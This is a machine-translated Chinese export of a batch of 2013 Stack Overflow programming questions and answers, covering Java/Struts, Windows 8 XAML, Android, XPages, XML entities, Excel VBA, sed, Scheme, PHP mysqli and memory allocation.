# StackOverflow 问答 15650000-15650999

# java - 从 JSP 的列表中填充用户定义的对象

> ID：15650002
> 
> 赞同：0
> 
> 时间：2013-03-27T00:36:04.987
> 
> 标签：java, jsp, struts2, ognl

在我的 Action 课程中，我有一个`Questions`. 我想从视图中填充。

```
public class MyQuizTest extends ActionSupport {

    public String addItemsToTemplate(){
         List<Question>  q=  myQuestions;
         System.out.println(q);

         return "success";
   }

    public List<Question> getMyQuestions() {
        return myQuestions;
    }

    public void setMyQuestions(List<Question> myQuestions) {
        this.myQuestions = myQuestions;
    }
    private List<Question> myQuestions;
} 
```

这是问题课

```
public class Question{

  public boolean isChosen(){
   retrun this.chosen
 }

  public void setChosen(boolean chosen){
    this.chosen  = chosen;
  }

  private boolean chosen;
} 
```

这是处理该问题的表格

```
<form method = "GET" action = "addItemsToTemplate">
    <s:iterator value = "myQuestions"  status="key" var = "questionItem">
    <s:checkbox  name = "myQuestions[%{#key.index}].chosen"   label="Check Me for testing"/>        
</s:iterator>
</form> 
```

此方法处理表单

```
public String addItemsToTemplate(){
            List<Question>  q=  myQuestions;
            System.out.println(q);

            return "success";
        } 
```

提交后，`myQuestions`返回一个`null`. 这是为什么？我想确定是否选择了相应的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T04:32:01.633

你在哪里填充动作层上的 myQuestions。

如果您没有在任何地方填充它，那么当在 JSP 上遇到 myQuestions 变量时，它是空/null，因此我认为流程不会进入您的迭代器循环。

```
<s:iterator value = "myQuestions"  status="key" var = "questionItem">
    <s:checkbox  name = "myQuestions[%{#key.index}].chosen"   label="Check Me for testing"/>        
</s:iterator> 
```

现在，如果您提交表单，myQuestions 对象肯定没有与 JSP 中的任何内容映射，因此将作为 null

# c# - 使用 XML 文件中的数据填充 GridView

> ID：15650003
> 
> 赞同：0
> 
> 时间：2013-03-27T00:36:14.057
> 
> 标签：c#, xaml, windows-8

因此，在 Windows 8 平板电脑应用程序中，我有一个具有以下属性的 GridView：

```
 <Grid>
        <GridView ItemsSource="{Binding Source={StaticResource manager}, Path=TestStrings}" />
    </Grid> 
```

这链接到另一个类中的属性 TestStrings。

```
public List<string> TestStrings
    {
        get
        {
            List<Location> locations = getLocations(); 

            List<string> testStrings = new List<string>();

            for (int i = 0; i < locationList.Count; i++)
            {
                testStrings.Add(locationList[i].Name);
            }

            return testStrings;
        }
    }

    public async Task<List<Location>> getLocations()
    {
        return await xmlParser.getLocations();
    } 
```

如果我只是用值填充一个字符串列表并返回它，GridView 会显示这些值，没问题。但是，问题是我需要调用异步方法。我的大部分数据将来自 XML 文件。要访问 XML 文件，我必须从存储中提取文件，据我所知，这需要我等待。这里，是那个方法：

```
public async Task<List<Location>> getLocations()
    {
        StorageFolder storageFolder = ApplicationData.Current.LocalFolder;
        StorageFile file = await storageFolder.GetFileAsync("main.xml");
        XmlDocument xmlDoc= await XmlDocument.LoadFromFileAsync(file);
        XDocument xml = XDocument.Parse(xmlDoc.GetXml());

        List<Location> locationList =
            (from _location in xml.Element("apps").Elements("app").Elements("locations").Elements("location")
             select new Location
             {
                 Name = _location.Element("name").Value,
             }).ToList();

        return locationList;
    } 
```

如您所见，我等待两次，这迫使我将其设为异步方法，这意味着调用它的所有方法都必须是异步的。但是，XAML 中的绑定属性需要我访问一个属性，该属性不能是异步的。

我觉得我错过了什么。我最近从 Android 转移到 Windows 8 中开始编程，所以很多对我来说都是新的。当然，将文件中的数据显示到 UI 是一项常见任务。处理它的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T05:26:36.410

尝试将列表的类型从 更改`List`为`ObservableCollection`，看看是否可以解决问题。您对异步行为的观察是正确的：对 List 的修改**不会**触发绑定引擎通知任何已更改的内容，并且更改会在某个未知时间后发生。该通知将在您使用[ObservableCollection](http://msdn.microsoft.com/en-us/library/ms748365.aspx)时发生。

# java - 弹出 AlertDialog 时显示键盘

> ID：15650005
> 
> 赞同：1
> 
> 时间：2013-03-27T00:36:36.910
> 
> 标签：java, android, android-softkeyboard

我已经研究了很多关于 SO 的答案，并提出了以下代码来在我的对话框弹出时显示键盘：

```
final AlertDialog alertDialog = new AlertDialog.Builder(this).create();
    alertDialog.setTitle("Title");
    final EditText input = new EditText(this);
    input.setOnFocusChangeListener(new View.OnFocusChangeListener() {
        @Override
        public void onFocusChange(View view, boolean focused) {
            alertDialog
                    .getWindow()
                    .setSoftInputMode(
                            WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE);

        }
    });
    input.setFocusable(true);
    input.requestFocus();
    alertDialog.setView(input);

            alertDialog.show(); 
```

对话框显示，但键盘没有弹出。如果这有所不同，这一切都在 onTouch(...) 方法中。

我的应用程序仅是横向模式。我发现在纵向模式下，它正在显示。为什么是这样？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-31T20:54:09.597

看起来是横向模式让我失望了。以下代码立即解决了这个问题：

```
imm.toggleSoftInput(InputMethodManager.SHOW_FORCED,
                        InputMethodManager.HIDE_IMPLICIT_ONLY);
                imm.showSoftInput(input, InputMethodManager.SHOW_FORCED);
                alertDialog
                        .getWindow()
                        .setSoftInputMode(
                                WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE); 
```

# xpages - 在 XPages 移动控件中转换时如何更新 Bean 或作用域变量

> ID：15650008
> 
> 赞同：0
> 
> 时间：2013-03-27T00:36:47.890
> 
> 标签：xpages, xpages-extlib

我在转换到该页面之前尝试在移动页面上设置值时遇到问题。

我有一个基于 Tony McGuckin 的 OpenNTF XSnippet 的脚本块。[http://openntf.org/XSnippets.nsf/snippet.xsp?id=calling-server-side-jscode-during-mobile-page-transitions](http://openntf.org/XSnippets.nsf/snippet.xsp?id=calling-server-side-jscode-during-mobile-page-transitions)

因此，当我转换到 ID 为“appPage3”的页面时，如果是 JSON-RPC 服务，我将调用方法“facilityCheckIn”。

我正在尝试在 viewScoped 托管 bean 中设置值，并且为了进行测试，我正在尝试设置普通的 viewScope 变量。

尽我所能告诉移动页面没有接受更改。它根本没有显示 viewScope。我不确定那是怎么回事。我相信托管 bean 正在获得它的价值，但它就像页面首先呈现。移动页面上的值第一次是空白的，然后如果我刷新或退出并返回到它确实显示的页面。我尝试通过 SSJS 和 EL 访问 bean。

当我进入和离开页面时，我真的需要能够为移动页面设置值。

任何意见，将不胜感激。

谢谢！！

我更新了下面的代码以显示完整的移动页面。我没有为应该显示字段但可以在必要时显示字段的自定义控件添加任何内容。

我创建了一个 6 分钟的视频来演示该问题，并且还显示了所有相关代码。

[http://traffic.libsyn.com/notesin9/SO-Question.mp4](http://traffic.libsyn.com/notesin9/SO-Question.mp4)

谢谢！！！

```
<xp:this.resources>
    <xp:styleSheet href="/.ibmxspres/dojoroot/dijit/themes/tundra/tundra.css"></xp:styleSheet>
    <xp:styleSheet href="/mobile.css"></xp:styleSheet>
</xp:this.resources>
<xc:ccDebugToolbar defaultCollapsed="false"
    collapseTo="left"></xc:ccDebugToolbar>
<xe:singlePageApp id="singlePageApp1"
    selectedPageName="home">
    <xe:djxmHeading id="djxmHeading1" label="My Inventory"></xe:djxmHeading>

    <xe:appPage id="homeID" pageName="home">
        <xe:djxmHeading id="djxmHeading2" label="My Inventory">
        </xe:djxmHeading>

        <xc:mob_menu_home></xc:mob_menu_home>
    </xe:appPage>

    <xe:appPage id="appPage2" pageName="facility" resetContent="true">
        <xc:mob_menu_facility></xc:mob_menu_facility>
    </xe:appPage>

    <xe:appPage id="appPage8" pageName="show" resetContent="true">
        <xc:mob_menu_show></xc:mob_menu_show>
    </xe:appPage>

    <xe:appPage id="appPage3" pageName="facilityCheckIn"
        resetContent="true">
        <xc:mob_page_CheckInOut header="Check In at Facility"
            scanType="Receiving" scanLocation="Facility">
        </xc:mob_page_CheckInOut>
    </xe:appPage>

    <xe:appPage id="appPage5" pageName="facilityCheckOut"
        resetContent="true">
        <xc:mob_page_CheckInOut header="Check Out from Facility"
            scanType="Shipping" scanLocation="Facility">
        </xc:mob_page_CheckInOut>
    </xe:appPage>

    <xe:appPage id="appPage6" pageName="showCheckOut"
        resetContent="true">
        <xc:mob_page_CheckInOut header="Check Out from Show"
            scanType="Shipping" scanLocation="Show">
        </xc:mob_page_CheckInOut>
    </xe:appPage>

    <xe:appPage id="appPage7" pageName="showCheckIn"
        resetContent="true">
        <xc:mob_page_CheckInOut header="Check In at Show"
            scanType="Receiving" scanLocation="Show">
        </xc:mob_page_CheckInOut>
    </xe:appPage>

    <!-- SUB PAGES -->

    <!--  GET MANIFEST Page -->
    <xe:appPage id="appPage4" pageName="manifest" resetContent="true">
        <xc:mob_page_Manifest></xc:mob_page_Manifest>
    </xe:appPage>

</xe:singlePageApp>

<xe:jsonRpcService id="jsonRpcService1" serviceName="appService">
    <xe:this.methods>

        <xe:remoteMethod name="setCurrentPage">
            <xe:this.arguments>
                <xe:remoteMethodArg name="pageName"></xe:remoteMethodArg>
                <xe:remoteMethodArg name="direction"></xe:remoteMethodArg>
            </xe:this.arguments>
            <xe:this.script><![CDATA[print("PageName " + pageName);
            print("Direction " + direction);
            viewScope.put("vsPage", "test");
App.setCurrentPage(pageName);
App.setCurrentDirection(direction);
return "";]]></xe:this.script>
        </xe:remoteMethod>
    </xe:this.methods>
</xe:jsonRpcService>
<xp:br></xp:br>
<xp:br></xp:br>
<xp:br></xp:br>

<xp:scriptBlock id="scriptBlock1">
    <xp:this.value><![CDATA[
        XSP.addOnLoad(function(){
            // Begin App Page 1
            var newPage = dijit.byId("#{id:appPage3}");

            if(null != newPage){
                dojo.connect(newPage, "onBeforeTransitionIn", function(){
                    var deferred = appService.setCurrentPage("facilityCheckIn", "onBeforeTransitionIn");
                    deferred.addCallback(function(result) {
                        console.log(result);
                    });
                });
                dojo.connect(newPage, "onBeforeTransitionOut", function(){
                    var deferred = appService.setCurrentPage("facilityCheckIn", "onBeforeTransitionOut");
                    deferred.addCallback(function(result) {
                        console.log(result);
                    });
                });
                dojo.connect(newPage, "onAfterTransitionIn", function(){
                    var deferred = appService.setCurrentPage("facilityCheckIn", "onAfterTransitionIn");
                    deferred.addCallback(function(result) {
                        console.log(result);
                    });
                });
                dojo.connect(newPage, "onAfterTransitionOut", function(){
                    var deferred =appService.setCurrentPage("facilityCheckIn", "onAfterTransitionOut");
                    deferred.addCallback(function(result) {
                        console.log(result);
                    });
                });
            }
            // End App Page 1

            // Begin Home Page

            var newPage = dijit.byId("#{id:homeID}");

            if(null != newPage){
                //console.log("Inside home Page")
                dojo.connect(newPage, "onBeforeTransitionIn", function(){
                    var deferred = appService.homePageReset();
                    deferred.addCallback(function(result) {
                        console.log(result);
                    });
                });
                dojo.connect(newPage, "onBeforeTransitionOut", function(){
                    var deferred = appService.homePageReset();
                    deferred.addCallback(function(result) {
                        console.log(result);
                    });
                }); 
            }
            // END Home Page

        // Insert new Code ABOVE THIS LINE
        }); // This ends the block that holds all the functions
    ]]></xp:this.value>
</xp:scriptBlock> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T12:22:13.170

前段时间我遇到了类似的问题，我不得不创建另一个 XPage（带有一个 SingleApplication）来导航，而不是仅仅跳转到同一个 SingleApplication 中的一个 appPage。

不理想，但是，它也为我解决了另一个问题，因为我希望能够直接跳转到有问题的页面（使用二维码）.. ;-)

/约翰

PS。将在此处跟踪您的发现，看看是否可以完成。移动控件的这种问题（我也有一些提前输入的问题）有点把我推向其他框架的方向，现在，无论如何......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:19:10.167

好的，我相信我已经解决了这个问题。我没有使用 Tony 的 XSnippet 中的 RPC 控制内容。你离开页面的工作，但如果你进入。这似乎可以按需要工作。

要处理输入，您需要将代码放在标题的 Rendering 事件中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-04T01:27:46.323

大卫....您说刷新确实解决了问题，斯蒂芬还提到转换到新页面发生在结果从 RPC 返回之前发生，我认为这是正确的。因此，在您的回调中，虽然不是最佳的，但至少可以让您继续前进，您可以使用以下方法触发部分刷新：

```
XSP.partialRefreshGet("#{id:appPage3}",{});
//I've had partial success with the "#{id:appPage3}" call, so I usually use a full
// dojo query like:
var appPageId = dojo.query("[id$='appPage3']")[0].id 
```

我不知道这是否会纠正您的问题，但似乎一切正常，除了填充该值。

# xml - 为什么外部系统实体在 Chrome、IE 或 Netscape 中不适合我？

> ID：15650009
> 
> 赞同：1
> 
> 时间：2013-03-27T00:37:05.767
> 
> 标签：xml, xml-parsing, doctype, dtd

我正在尝试复制此答案中给出的示例：

[https://stackoverflow.com/a/5127928/356011](https://stackoverflow.com/a/5127928/356011)

这说明了使用外部实体将 XML 文件的片段包含在另一个 XML 文件中。

文档.xml：

```
<?xml version="1.0" standalone="no" ?>
<!DOCTYPE doc [
        <!ENTITY otherFile SYSTEM "otherFile.xml">
        ]>
<doc>
    <foo>
        <bar>&otherFile;</bar>
    </foo>
</doc> 
```

其他文件.xml：

```
<baz>this is my content</baz> 
```

当我尝试通过在任何浏览器中打开 doc.xml 来测试它时，我得到：

```
 <doc>
   <foo>
      <bar/>
    </foo>
 </doc> 
```

呈现。

它不应该也渲染包含的文件吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T09:34:24.760

它不起作用的原因是浏览器不完全支持 XML。他们仅通过限制来支持它，例如“没有外部实体”。我不知道为什么。

# eclipse - 在 Eclipse 控制台中出现错误说致命错误

> ID：15650010
> 
> 赞同：0
> 
> 时间：2013-03-27T00:37:36.417
> 
> 标签：eclipse

我在 Eclipse 中对我的 java 类进行了一些更改并得到了一些错误，然后我修复了这些错误。现在我无法运行我的项目，它不断给我以下错误，我不知道该怎么处理它。如果有人在此之前遇到过此错误，请帮助我

```
#
# A fatal error has been detected by the Java Runtime Environment:
#
#  Internal Error (classFileParser.cpp:3470), pid=4716, tid=8380
#  Error: ShouldNotReachHere()
#
# JRE version: 7.0-b147
# Java VM: Java HotSpot(TM) 64-Bit Server VM (21.0-b17 mixed mode windows-amd64 compressed oops)
# Failed to write core dump. Minidumps are not enabled by default on client versions of Windows
#
# An error report file with more information is saved as:
# C:\project\hs_err_pid4716.log
#
# If you would like to submit a bug report, please visit:
#   http://bugreport.sun.com/bugreport/crash.jsp
# 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:42:06.800

我无法在这里解释。请参阅此处以供参考

[http://independentlyowned.co.uk/2010/11/16/solved-internal-error-classfileparser-cpp3161/](http://independentlyemployed.co.uk/2010/11/16/solved-internal-error-classfileparser-cpp3161/)

[http://independentlyemployees.co.uk/2010/11/17/worked-out-why/](http://independentlyemployed.co.uk/2010/11/17/worked-out-why/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T07:27:15.120

那是虚拟机的错误，不一定说明你自己的代码有问题。对我来说，您安装的 Java 版本号看起来像是 JDK 7 的一个非常旧的 beta 版本。请升级到最近的 JDK 7 版本，该错误可能早已得到修复。

# ios - 在主从视图和其他视图控制器之间切换？

> ID：15650015
> 
> 赞同：0
> 
> 时间：2013-03-27T00:38:04.233
> 
> 标签：ios, ipad, ios6

我现在正在为 Ipad 测试一个应用程序。基本上我正在使用模板进行主详细信息应用程序并有另一个 PortraitViewController。现在，当应用程序以纵向模式启动时，我希望它仅显示 PortraitViewController，而当设备旋转时，例如横向模式，我希望仅显示 master-detailViewController。做这个的最好方式是什么。

我正在测试单视图应用程序的示例代码，但主从视图拒绝隐藏：

```
- (void)willAnimateRotationToInterfaceOrientation:(UIInterfaceOrientation)
interfaceOrientation duration:(NSTimeInterval)duration {
    if (interfaceOrientation == UIInterfaceOrientationPortrait) {
        self.view = self.portrait;
        self.view.transform = CGAffineTransformIdentity;
        self.view.transform =
        CGAffineTransformMakeRotation(degreesToRadians(0));
        self.view.bounds = CGRectMake(0.0, 0.0, 320.0, 460.0);
    }
    else if (interfaceOrientation == UIInterfaceOrientationLandscapeLeft) {
        self.view = self.landscape;
        self.view.transform = CGAffineTransformIdentity;
        self.view.transform =
        CGAffineTransformMakeRotation(degreesToRadians(−90));
        self.view.bounds = CGRectMake(0.0, 0.0, 480.0, 300.0);
    }
    else if (interfaceOrientation ==
             UIInterfaceOrientationLandscapeRight) {
        self.view = self.landscape;
        self.view.transform = CGAffineTransformIdentity;
        self.view.transform =
        CGAffineTransformMakeRotation(degreesToRadians(90));
        self.view.bounds = CGRectMake(0.0, 0.0, 480.0, 300.0);
} } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T00:48:16.217

视图控制器不应该像这样实时更改其视图。您没有看到任何事情发生，因为视图控制器的旧视图仍在界面中；您不会将其从界面中删除。你也不应该这样做。实现这一点的方法是更换*视图控制器*；使用不同的视图控制器和不同的视图。

您从主从视图控制器开始，因此应用程序的根视图控制器是 UISplitViewController。它的视图（拆分视图），它出现，是您要删除的视图。因此，您必须将 UISplitViewController 替换为窗口的`rootViewController`.

但这是一个巨大的痛苦。我认为在纵向放置时，将模态（呈现的）视图控制器放在所有东西的前面可能会更快乐。

这是一个可下载的示例项目，它呈现一个视图控制器以响应设备旋转：

[https://github.com/mattneub/Programming-iOS-Book-Examples/tree/master/ch19p609rotationForcingModalView](https://github.com/mattneub/Programming-iOS-Book-Examples/tree/master/ch19p609rotationForcingModalView)

# javascript - Jquery UI 元素未显示在 Facebox 中

> ID：15650019
> 
> 赞同：0
> 
> 时间：2013-03-27T00:38:34.360
> 
> 标签：javascript, jquery, ruby-on-rails, jquery-ui, facebox

我正在制作一个 Rails 3.1 应用程序。在那个应用程序中，我一直在使用运行良好的 facebox，不幸的是，我无法让 jquery ui 元素出现在 facebox 中。如果我导航到 facebox jquery ui 内的页面，效果很好。

到目前为止，这是我尝试过的，我把它放在包含 facebox 链接的页面上

```
$(document).ready(function () {

$("#progressbar").progressbar({ value: 37 });

}); 
```

我还在 facebox 中包含的页面上尝试了完全相同的代码

我也试过这个

```
$(document).ready(function () {
$("body").on("load", "#progressbar", function(){

$("#progressbar").progressbar({ value: 37 });

});
}); 
```

facebox里的erb代码是这样的

```
<h1> Congrats </h1>

<div id="progressbar"></div> 
```

Facebox是这样调用的

```
 $(document).ready(function() {

 $("#userform2").submit(function() {

 jQuery.facebox({ ajax: '/users/award' });

 });
 }); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T06:01:34.293

我找到了一个解决方案，但不是一个好的解决方案。我只创建了一个仅包含 jquery ui 元素的单独页面。然后我将该页面加载到 faceboxed 页面内的 iframe 中。

# autohotkey - 在 Autohotkey 中获取变量类型

> ID：15650020
> 
> 赞同：1
> 
> 时间：2013-03-27T00:38:37.957
> 
> 标签：autohotkey

为什么这可以确定类型

```
if delay is integer
{
    MsgBox You set delay = %delay% seconds
    return
}
else
{
    MsgBox "%delay%" is not a valid number.
    goSub, input    
} 
```

但不是这个 - 这也允许非整数值，只要它大于 0

```
if (delay is integer and delay > 0)
{
    MsgBox You set delay = %delay% seconds
    return
}
else
{
    MsgBox "%delay%" is not a valid number.
    goSub, input    
} 
```

这两个片段都用于检查输入框的结果。该脚本旨在帮助提取电影或某事。虽然你在完成第一部分左右后仍在下载并已经在观看它..

这是完整的脚本，以防有人感兴趣。

```
delay := 120
help = Help - Unzip Auto Extractor`nF1: Help`nF2: Get Unzip Window`n(must be in foreground)`nF3: Set unpack delay (seconds, default 120)`nF4: Start or stop unpacking`nF5: Exit
MsgBox %help%
F1::
MsgBox %help%
return

F2::
WinGetTitle, title, A
MsgBox Selected window "%title%"
return

F3::
input:
InputBox, delay, Set extraction timeout in seconds..,Use numbers only,,,,,,,,%delay%
;InputBox, OutputVar [, Title, Prompt, HIDE, Width, Height, X, Y, Font, Timeout, Default] 
if delay is integer
{
    MsgBox You set delay = %delay% seconds
    return
}
else
{
    MsgBox "%delay%" is not a valid number.
    goSub, input    
}

#MaxThreadsPerHotkey 3
F4::
#MaxThreadsPerHotkey 1
if KeepWinZRunning
{
    KeepWinZRunning := 0
    return
}
else
{
KeepWinZRunning := 1
}
Loop
{   
    Loop %delay%
    {
        sleep 1000
        if not KeepWinZRunning
        {
            break   
        }
    }
    if not KeepWinZRunning
    {
        break           
    }   
    ControlSend,,{Enter},%title%    
}
KeepWinZRunning := 0
return

F5::
ExitApp
return 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:53:25.170

我认为 autohotkey [If var is [not] type](http://www.autohotkey.com/docs/commands/IfIs.htm)文档中的这句话将回答您的问题：

*注意：表达式中不支持运算符“between”、“is”、“in”和“contains”。*

请注意，无论此规则如何，第二个示例对我来说都可以正常工作。

# excel - 如何使用特定的工作表顺序将工作表数组保存为 PDF

> ID：15650023
> 
> 赞同：0
> 
> 时间：2013-03-27T00:38:53.787
> 
> 标签：excel, pdf-generation, vba

我有一个包含多张工作表的工作簿，我想选择并转换为单个 PDF 文件。

我编写了以下代码，可以正常工作并创建文件：

```
Sub Print_Project_Report_To_PDF

    Dim FilePathandName As String
    MyDate = Format(DateSerial(Year(Now), Month(Now) - 1, 1), "mmmm yyyy")
    MyPath = ThisWorkbook.Path & "\"
    MyFile = "Project Progress Report - " & MyDate & ".pdf"
    FilePathandName = MyPath & MyFile

    ThisWorkbook.Sheets(Array("PR_COVER_PAGE", "PR_SUMMARY", _
    "PR_PROJECT_DETAILS", "PR_INTERNAL RESOURCES", "PR_TIME", _
    "PR_REVENUE_FORECAST_SUMMARY", "PR_ORIGINAL_REVENUE_FORECAST", _
    "PR_ACTUAL_REVENUE_FORECAST", "PR_COSTS", "PR_ISSUES", "MONTHLY FINANCIAL    REPORT", _
    "PG-SC_COVER_LETTER", "PG-SC_CLAIM_SUMMARY", "PG-SC_TRADE", "PG-SC_HYDRAULICS", _
    "PG-SC_MECHANICAL", "PG-SC_MEDICAL_GASES", "PG-SC_ELECTRICAL", "PG-SC_VARIATION", _
    "PG-SC_MONTHLY_CASHFLOW", "PG-MH_COVER_LETTER", "PG-MH_CLAIM_SUMMARY", _
    "PG-MH_TRADE", "PG-MH_HYDRAULICS", "PG-MH_MECHANICAL", "PG-MH_MEDICAL_GASES", _
    "PG-MH_ELECTRICAL", "PG-MH_VARIATION", "PG-MH_MONTHLY_CASHFLOW", "CLIENT_COVER", _
    "CLIENT_SUMMARY", "CLIENT_ISSUES")).Select

    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, Filename:=FilePathandName, _
    Quality:=xlQualityStandard, IncludeDocProperties:=True, _
    IgnorePrintAreas:=False, OpenAfterPublish:=True

    ThisWorkbook.Sheets("Dashboard").Select

End Sub 
```

问题是 PDF 文件不是按照我在数组中指定的顺序创建的。它们按照它们在工作簿中出现的顺序（从左到右）。它正确地只包括我想要的床单，但不是我想要的顺序。

我也不想更改工作簿中工作表的顺序，因为它是以特定的渐进方式设置的。

任何人都可以帮助我编写代码，让我在发布文档时能够具体说明工作表的顺序吗？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T06:57:05.977

我同意@SiddharthRout 在问题下方的第一个想法/评论中。但是，在非常相似的情况下，当我打印复杂的 PowerPoint 演示文稿时，我使用

[PDFCreator 应用程序](http://sourceforge.net/projects/pdfcreator/)

第一步，我运行该软件并设置“停止打印”选项。比您可以单独发送到该软件（以打印工作表的方式）每个工作表，这将是在开始时以正确顺序堆叠在列表中的单独文档。使用特殊功能，您可以将它们匹配到一个文档中然后打印。这是非常有用且非常可靠的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T07:40:27.483

这是一些示例 VBA 代码，如何将当前工作簿复制到临时文件中并重新排序工作表列表。在打印之前使用这样的例程：

```
Sub CopyAndReorder()
    Dim wbCopy As Workbook
    ThisWorkbook.SaveCopyAs "C:\TEMP\XXXX.XLS"
    Set wbCopy = Workbooks.Open("C:\TEMP\XXXX.XLS")
    ReorderSheets wbCopy
End Sub

Sub ReorderSheets(wb As Workbook)
    Dim shNames As Variant, shName As Variant, sh As Worksheet
    shNames = Array("Table3", "Table2", "Table1")
    For Each shName In shNames
        Set sh = wb.Sheets(shName)
        sh.Move After:=wb.Sheets(wb.Sheets.Count)
    Next
End Sub 
```

（您必须根据您的需要调整此代码段，当然，使用更好的临时文件名，之后删除新文件，提供外部工作表列表等，但我认为您明白了）。

# regex - 使用 sed 将单词插入文本文件

> ID：15650025
> 
> 赞同：3
> 
> 时间：2013-03-27T00:39:08.597
> 
> 标签：regex, unix, sed

我有一个文本文件，我想在文件中以小写字母开头的每个单词之前插入一个像**house这样的单词，使用 sed。**我已经尝试过了，但它不起作用：

```
sed "s/(^[a-z]+| [a-z]+)/house (^[a-z]+| [a-z]+)/g" textfile. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T00:46:25.433

我有这条线，你可以吗？

```
sed -r 's/\b[a-z]\w*\b/HOUSE &/g' file 
```

例如：

```
kent$ echo "yes No yES NO y_e_s _no"|sed -r 's/\b[a-z]\w*\b/HOUSE &/g'
HOUSE yes No HOUSE yES NO HOUSE y_e_s _no 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T00:52:23.207

POSIX 友好版本：

```
sed -e 's/\([^[:alpha:]]\)\([a-z][[:alpha:]]*\)/\1house \2/g' 
    -e 's/^\([a-z]\)/house \1/' input 
```

# random - 随机通过二叉树？

> ID：15650027
> 
> 赞同：1
> 
> 时间：2013-03-27T00:39:11.803
> 
> 标签：random, tree, scheme, binary-tree

我正在制作一个程序，它采用一棵树并随机选择一个分支（左或右）并在列表中返回这些值。由于某种原因，它不起作用。有什么帮助吗？

例子：

```
~(rand-walk (tree 1 (leaf 2) (leaf 3)))
(1 2) 
```

这是我到目前为止所拥有的：

```
(define (rand-walk tr)
 (if (empty-tree? tr) '()
   (if (leaf? tr) tr
      (if (equal? (random 1) 0)
              (cons ((root-value tr)(root-value (left-subtree tr))) '())
              (cons ((root-value tr)(root-value (right-subtree tr))) '()))))) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T00:56:22.330

免责声明：我从来没有用过Scheme，但大约15年前我和LISP有过一次短暂的接触=）

您的递归部分不是递归的。您应该调用`rand-walk`子树并对其进行`cons`处理。

```
 (cons ((root-value tr)(rand-walk (left-subtree tr))) '())
          (cons ((root-value tr)(rand-walk (right-subtree tr))) '()))))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T00:58:06.073

如果你想遍历它，那么你应该在到达叶子时返回一个列表：

```
(if (leaf? tr) (cons tr '()) 
```

在你的递归步骤中，你应该`cons`使用一些递归调用：

```
(cons (root-value tr) (rand-walk (left-subtree tr))) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T01:06:30.537

您的代码中存在许多问题。这是一个正确的实现：

```
(define (rand-walk tr)
 (cond ((empty-tree? tr) '())
       ((leaf? tr) (list (root-value tr)))
       ((equal? (random 1) 0)
        (cons (root-value tr) (rand-walk (left-subtree tr))))
       (else
        (cons (root-value tr) (rand-walk (right-subtree tr)))))) 
```

如果我在写这篇文章，我会使用尾递归方法：

```
(define (rand-walk tr)
  (assert (not (empty-tree? tr)))
  (let walking ((l '()) (tr tr))
    (let ((value (root-value tr)))
      (if (leaf? tr)
          (reverse (cons value l))
          (walking (cons value l))
                   ((if (zero? (random 1)) left-subtree right-subtree) tr)))))) 
```

# php - 将静态值映射到静态值

> ID：15650028
> 
> 赞同：0
> 
> 时间：2013-03-27T00:39:13.883
> 
> 标签：php, mysqli

我正在尝试将数组中的一些值与用户输入的值进行映射。这里 $actual 来自用户， $target 来自表

```
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
else

{
    $actual; 
    $comment; $con;
    foreach($_POST['value']  as $country => $value1 ){
        foreach($value1  as $goal => $value2){
                    //value => ["matrix"]
                    foreach($value2 as   $matrix => $value3){
                            //value => string 
                             $country ." ". $goal." " .$matrix. " " . $value3."<br/>";  
                            if($matrix == "actual"){
                                $actual = $value3;  
                            }else if($matrix=="comment"){
                                $comment=$value3;

                            }

                    }
              $sql="SELECT target FROM target where ini_id = '$ini' and country_id='$country' and metric_id='$goal'"; 
              $result=mysql_query($sql);
              $target = mysqli_fetch_array($result);

                insert($actual,$target['target'],$country.$ini.$goal ,$comment,$con); 
```

警告：mysqli_fetch_array() 期望参数 1 为 mysqli_result，布尔值在第 107 行的 C:\xampp\htdocs\xampp\Testing\sq1.php 中给出

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:57:31.973

我看到的问题是你正在使用`mysql_query`而不是`mysqli_query`

（因此 mysqli_fetch_array 并不真正知道如何解释该参数）

# memory-management - 什么时候最适合内存分配有用

> ID：15650029
> 
> 赞同：8
> 
> 时间：2013-03-27T00:39:15.663
> 
> 标签：memory-management, contiguous

我正在阅读操作系统概念要点第 8 版。当作者检查连续内存分配和最差拟合时，作者声明“分配最大的孔。同样，我们必须搜索整个列表，除非它按大小排序。这种策略会产生最大的剩余孔，这可能比最合适的方法留下的更小的剩余孔。”

所以我的问题是，什么时候留下最大的剩余洞是更好的方法？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-06-09T07:21:24.250

如果提交的所有流程的大小都差不多，那么留下最大的剩余漏洞可能是一种更好的方法。

在这种情况下，如果你有一个大的空闲块（比如 50MB）并且大多数提交的进程往往小于那个（比如 10MB），实际上最好把它们放在这个大块中，这样你就可以使用剩余空间更好，而不是将它们放在一个稍微大一点的块（可能是 11-15MB）中，这样会留下一些小的不可用空间。

我不知道它是否真的在任何地方使用过。

